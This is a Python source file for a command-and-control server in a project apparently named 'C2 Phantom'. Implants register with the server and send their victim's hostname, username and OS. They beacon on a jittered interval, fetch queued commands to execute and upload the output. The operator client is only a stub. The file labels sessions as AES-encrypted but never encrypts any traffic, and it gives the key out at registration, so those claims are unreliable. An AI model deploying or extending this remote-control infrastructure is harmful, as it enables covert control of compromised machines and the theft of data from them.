"""
C2 Server implementation for C2 Phantom.

Handles incoming connections from agents/implants and processes commands.
"""

import asyncio
import json
import logging
from typing import Dict, Any, Optional, Callable
from datetime import datetime
from pathlib import Path

from aiohttp import web
from cryptography.fernet import Fernet

from c2_phantom.core.session import SessionManager, Session, SessionStatus
from c2_phantom.core.exceptions import NetworkError
from c2_phantom.crypto.encryption import AESEncryption, EncryptionManager


logger = logging.getLogger(__name__)


class C2Server:
    """
    C2 Server that listens for agent connections and processes commands.
    """

    def __init__(
        self,
        host: str = "0.0.0.0",
        port: int = 8443,
        encryption_key: Optional[bytes] = None,
        session_manager: Optional[SessionManager] = None,
    ) -> None:
        """
        Initialize C2 server.

        Args:
            host: Server bind address
            port: Server bind port
            encryption_key: Encryption key for communications
            session_manager: Session manager instance
        """
        self.host = host
        self.port = port
        self.encryption_key = encryption_key or Fernet.generate_key()
        self.session_manager = session_manager or SessionManager()
        self.app = web.Application()
        self._setup_routes()
        self.active_connections: Dict[str, Any] = {}
        
        # Command queue for each session
        self.command_queues: Dict[str, asyncio.Queue] = {}
        
        # Response storage
        self.responses: Dict[str, Dict[str, Any]] = {}

    def _setup_routes(self) -> None:
        """Set up HTTP routes for C2 communication."""
        self.app.router.add_post("/beacon", self.handle_beacon)
        self.app.router.add_post("/register", self.handle_register)
        self.app.router.add_get("/tasks/{session_id}", self.handle_get_tasks)
        self.app.router.add_post("/results/{session_id}", self.handle_post_results)
        self.app.router.add_get("/health", self.handle_health)

    async def handle_health(self, request: web.Request) -> web.Response:
        """Health check endpoint."""
        return web.json_response({"status": "ok", "timestamp": datetime.now().isoformat()})

    async def handle_beacon(self, request: web.Request) -> web.Response:
        """
        Handle agent beacon.
        
        Agents send periodic beacons to maintain connection.
        """
        try:
            data = await request.json()
            session_id = data.get("session_id")
            
            if not session_id:
                return web.json_response({"error": "Missing session_id"}, status=400)
            
            # Update session last seen
            session = self.session_manager.get_session(session_id)
            if session:
                session.update_last_seen()
                self.session_manager.save_session(session)
                logger.info(f"Beacon received from session {session_id}")
                
                return web.json_response({
                    "status": "ok",
                    "timestamp": datetime.now().isoformat(),
                    "has_tasks": session_id in self.command_queues and not self.command_queues[session_id].empty()
                })
            else:
                return web.json_response({"error": "Session not found"}, status=404)
                
        except Exception as e:
            logger.error(f"Error handling beacon: {e}")
            return web.json_response({"error": str(e)}, status=500)

    async def handle_register(self, request: web.Request) -> web.Response:
        """
        Handle agent registration.
        
        New agents register themselves and receive a session ID.
        """
        try:
            data = await request.json()
            
            # Extract agent information
            hostname = data.get("hostname", "unknown")
            username = data.get("username", "unknown")
            os_info = data.get("os", "unknown")
            ip_address = request.remote
            
            # Create session
            metadata = {
                "hostname": hostname,
                "username": username,
                "os": os_info,
                "ip_address": ip_address,
                "registered_at": datetime.now().isoformat()
            }
            
            session = self.session_manager.create_session(
                target=ip_address,
                protocol="https",
                encryption="aes256-gcm",
                metadata=metadata
            )
            
            session.status = SessionStatus.ACTIVE
            self.session_manager.update_session(session.id, status=SessionStatus.ACTIVE)
            
            # Initialize command queue
            self.command_queues[session.id] = asyncio.Queue()
            
            logger.info(f"New agent registered: {session.id} from {ip_address}")
            
            return web.json_response({
                "session_id": session.id,
                "encryption_key": self.encryption_key.hex() if isinstance(self.encryption_key, bytes) else self.encryption_key,
                "beacon_interval": 60,  # seconds
                "jitter": 30  # seconds
            })
            
        except Exception as e:
            logger.error(f"Error handling registration: {e}")
            return web.json_response({"error": str(e)}, status=500)

    async def handle_get_tasks(self, request: web.Request) -> web.Response:
        """
        Handle agent requesting tasks.
        
        Returns pending commands for the agent to execute.
        """
        try:
            session_id = request.match_info["session_id"]
            
            session = self.session_manager.get_session(session_id)
            if not session:
                return web.json_response({"error": "Session not found"}, status=404)
            
            # Update last seen
            session.update_last_seen()
            self.session_manager.save_session(session)
            
            # Get tasks from queue
            tasks = []
            if session_id in self.command_queues:
                queue = self.command_queues[session_id]
                try:
                    # Get all available tasks (non-blocking)
                    while not queue.empty():
                        task = await asyncio.wait_for(queue.get(), timeout=0.1)
                        tasks.append(task)
                except asyncio.TimeoutError:
                    pass
            
            return web.json_response({
                "tasks": tasks,
                "timestamp": datetime.now().isoformat()
            })
            
        except Exception as e:
            logger.error(f"Error getting tasks: {e}")
            return web.json_response({"error": str(e)}, status=500)

    async def handle_post_results(self, request: web.Request) -> web.Response:
        """
        Handle agent posting command results.
        """
        try:
            session_id = request.match_info["session_id"]
            data = await request.json()
            
            session = self.session_manager.get_session(session_id)
            if not session:
                return web.json_response({"error": "Session not found"}, status=404)
            
            # Store results
            task_id = data.get("task_id")
            if task_id:
                if session_id not in self.responses:
                    self.responses[session_id] = {}
                
                self.responses[session_id][task_id] = {
                    "output": data.get("output"),
                    "error": data.get("error"),
                    "exit_code": data.get("exit_code", 0),
                    "timestamp": datetime.now().isoformat()
                }
                
                logger.info(f"Received results for task {task_id} from session {session_id}")
            
            return web.json_response({"status": "ok"})
            
        except Exception as e:
            logger.error(f"Error handling results: {e}")
            return web.json_response({"error": str(e)}, status=500)

    async def queue_command(self, session_id: str, command: str, task_id: Optional[str] = None) -> str:
        """
        Queue a command for an agent to execute.
        
        Args:
            session_id: Target session ID
            command: Command to execute
            task_id: Optional task ID (generated if not provided)
            
        Returns:
            Task ID
        """
        if session_id not in self.command_queues:
            self.command_queues[session_id] = asyncio.Queue()
        
        if not task_id:
            task_id = f"task_{datetime.now().timestamp()}"
        
        task = {
            "id": task_id,
            "type": "execute",
            "command": command,
            "timestamp": datetime.now().isoformat()
        }
        
        await self.command_queues[session_id].put(task)
        logger.info(f"Queued command for session {session_id}: {command}")
        
        return task_id

    async def get_command_result(self, session_id: str, task_id: str, timeout: int = 30) -> Optional[Dict[str, Any]]:
        """
        Wait for and retrieve command result.
        
        Args:
            session_id: Session ID
            task_id: Task ID
            timeout: Timeout in seconds
            
        Returns:
            Command result or None if timeout
        """
        start_time = asyncio.get_event_loop().time()
        
        while asyncio.get_event_loop().time() - start_time < timeout:
            if session_id in self.responses and task_id in self.responses[session_id]:
                return self.responses[session_id][task_id]
            
            await asyncio.sleep(1)
        
        return None

    async def start(self) -> None:
        """Start the C2 server."""
        runner = web.AppRunner(self.app)
        await runner.setup()
        site = web.TCPSite(runner, self.host, self.port)
        await site.start()
        logger.info(f"C2 Server started on {self.host}:{self.port}")

    def run(self) -> None:
        """Run the C2 server (blocking)."""
        web.run_app(self.app, host=self.host, port=self.port)


class C2Client:
    """
    C2 Client for connecting to C2 server and sending commands.
    """

    def __init__(self, server_url: str, encryption_key: Optional[bytes] = None) -> None:
        """
        Initialize C2 client.
        
        Args:
            server_url: C2 server URL
            encryption_key: Encryption key
        """
        self.server_url = server_url.rstrip("/")
        self.encryption_key = encryption_key

    async def send_command(
        self,
        session_id: str,
        command: str,
        timeout: int = 30
    ) -> Dict[str, Any]:
        """
        Send command to agent via C2 server.
        
        Args:
            session_id: Target session ID
            command: Command to execute
            timeout: Command timeout
            
        Returns:
            Command result
        """
        # This would interact with the C2 server
        # For now, it's a placeholder for the client-side logic
        raise NotImplementedError("Client implementation pending")
